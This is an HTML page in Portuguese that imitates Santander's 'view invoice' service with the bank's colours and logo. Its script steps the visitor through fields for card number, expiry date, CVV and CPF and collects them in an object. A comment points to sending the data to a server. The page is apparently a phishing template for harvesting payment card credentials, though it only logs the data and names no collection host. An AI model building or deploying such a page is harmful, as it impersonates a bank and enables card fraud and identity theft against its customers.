<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consultar Fatura</title>
    <style>
        /* Estilos Gerais */
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
        }

        /* Cabeçalho */
        .header {
            background-color: #eb0104; /* Cor do Santander */
            padding: 10px 20px;
            display: flex;
            align-items: center;
        }
        .header img {
            height: 40px;
        }

        /* Conteúdo Principal */
        .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 40px;
            gap: 20px;
            flex-wrap: wrap;
        }

        /* Coluna Esquerda */
        .left {
            max-width: 50%;
            flex: 1;
        }
        .left h1 {
            font-size: 24px;
            font-weight: bold;
            color: #333;
        }
        .left p {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
        }

        /* Coluna Direita (Formulário) */
        .right {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 300px;
            flex: 1;
        }
        .right input {
            width: 95%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        .right button {
            width: 100%;
            padding: 10px;
            background-color: #eb0104; /* Cor do Santander */
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .right button:hover {
            background-color: #b01010; /* Cor de destaque ao passar o mouse */
        }

        /* Responsividade */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                align-items: flex-start;
                padding: 20px;
            }
            .left {
                max-width: 100%;
            }
            .left h1 {
                font-size: 20px;
            }
            .left p {
                font-size: 13px;
            }
        }
        @media (max-width: 480px) {
            .right {
                width: 100%;
                padding: 15px;
            }
            .right input,
            .right button {
                font-size: 14px;
            }
            .left h1 {
                font-size: 18px;
            }
            .left p {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQ0MLAOBDA7ZdCYsUzHTcUWLMezr5MeFDqtv97SnG_DDtxwroXWihDhuU&s=10" alt="Santander Logo">
    </div>
    <div class="container">
        <div class="left">
            <h1>Consultar fatura</h1>
            <p>Receba a 2ª via da sua fatura Santander por e-mail.</p>
            <p>Para consultar sua fatura ou atualizar seu endereço de e-mail, acesse sua conta ou entre em contato com o atendimento.</p>
        </div>
        <div class="right">
            <form id="form">
                <input type="text" id="inputField" placeholder="Número do cartão" required>
                <button type="button" id="nextButton">Continuar</button>
            </form>
        </div>
    </div>

    <script>
        // Lista de campos que serão exibidos
        const fields = [
            { placeholder: "Número do cartão", id: "cardNumber" },
            { placeholder: "Data de validade (MM/AA)", id: "expiryDate" },
            { placeholder: "CVV", id: "cvv" },
            { placeholder: "CPF", id: "cpf" }
        ];

        let currentIndex = 0; // Índice do campo atual
        const formData = {}; // Objeto para armazenar as informações

        const inputField = document.getElementById("inputField");
        const nextButton = document.getElementById("nextButton");

        nextButton.addEventListener("click", () => {
            // Salva o valor do campo atual
            const currentField = fields[currentIndex];
            formData[currentField.id] = inputField.value;

            // Avança para o próximo campo ou finaliza
            currentIndex++;
            if (currentIndex < fields.length) {
                // Atualiza o input para o próximo campo
                inputField.value = "";
                inputField.placeholder = fields[currentIndex].placeholder;
            } else {
                // Exibe os dados coletados no console
                console.log("Dados coletados:", formData);
                alert("Todos os dados foram preenchidos!");
                // Aqui você pode enviar os dados para o servidor ou realizar outra ação
            }
        });
    </script>
</body>
</html>
